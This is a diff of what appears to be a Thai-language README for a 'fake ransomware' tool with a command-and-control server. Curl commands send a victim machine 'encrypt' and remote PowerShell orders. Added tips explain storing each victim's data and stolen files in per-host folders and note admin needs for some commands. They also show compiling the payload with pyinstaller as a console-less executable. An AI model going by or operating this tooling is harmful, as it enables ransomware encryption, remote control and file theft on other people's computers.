@@ -66,6 +66,13 @@ curl -X POST -H "Content-Type: application/json" -d '{"hostname": "<ชื่อ
 ตัวอย่าง -> curl -X POST -H "Content-Type: application/json" -d '{"hostname": "DESKTOP-BKQ27N9", "cmd": "encrypt"}' http://192.168.10.151:8080/set_command
 ตัวอย่าง curl -X POST -H "Content-Type: application/json" -d '{"hostname": "DESKTOP-BKQ27N9", "pws": "start-process https://google.com"}' http://192.168.10.151:8080/set_shell
 
-
-
+pro tips :
+ถ้าเกิดจะรันใหม้แนะนำให้รัน C2 server ก่อน ค่อยรัน fake_ransom.py
+ตอนที่เครื่องเหยื่อเชื่อมกับ C2 ครั้งแรกจะมีการสร้างโฟลเดอร์ชื่อเครื่องเหยื่อไว้ (เช็คได้ข้างๆไฟล์ c2_server.py อยู่)
+  - ในส่วนโฟลเดอร์นี้จะไว้เก็บข้อมูลต่างๆของเหยื่อแต่ละคน เช่น ข้อมูลเครื่อง, ขโมยไฟล์ต่างๆมาเก็บ
+  - ยังไม่ได้ทดสอบขโมยไฟล์ดู (ใครสนจัดไป)
+ในส่วนสั่งการ powershell บางคำสั่งอาจจะติด admin แนะนำให้เทส
+ถ้าอยากทดสอบ compile ให้ใช้ pyinstaller 
+  -> เปิด cmd พิมพ์ pip install pyinstaller 
+  -> ที่ terminal ของ ไฟล์ fake_ransom.py พิพม์ pyinstaller --onefile --noconsole fake_ransomware.py 
 
